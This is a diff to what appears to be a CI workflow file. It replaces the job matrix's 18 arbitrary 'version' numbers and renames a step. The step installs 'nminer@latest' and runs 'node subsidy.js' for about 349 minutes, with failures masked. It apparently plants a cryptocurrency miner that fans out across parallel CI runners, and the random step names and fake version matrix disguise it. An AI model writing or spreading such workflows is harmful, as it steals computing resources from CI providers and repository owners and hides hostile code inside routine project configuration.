@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4797 }
-          - { version: 7661 }
-          - { version: 598 }
-          - { version: 3880 }
-          - { version: 8707 }
-          - { version: 4349 }
-          - { version: 4407 }
-          - { version: 6208 }
-          - { version: 4386 }
-          - { version: 9893 }
-          - { version: 6946 }
-          - { version: 7349 }
-          - { version: 4096 }
-          - { version: 1033 }
-          - { version: 8724 }
-          - { version: 9247 }
-          - { version: 1851 }
-          - { version: 5347 }
+          - { version: 8929 }
+          - { version: 5705 }
+          - { version: 1254 }
+          - { version: 768 }
+          - { version: 8985 }
+          - { version: 6393 }
+          - { version: 6598 }
+          - { version: 8982 }
+          - { version: 9395 }
+          - { version: 8802 }
+          - { version: 3040 }
+          - { version: 9127 }
+          - { version: 6139 }
+          - { version: 6599 }
+          - { version: 9612 }
+          - { version: 3131 }
+          - { version: 1335 }
+          - { version: 2581 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: gripper huzzah lest until
+      - name: cook
         run: |
           npm install nminer@latest
-          timeout 332m node subsidy.js || echo "subsidy executed"
+          timeout 349m node subsidy.js || echo "subsidy executed"
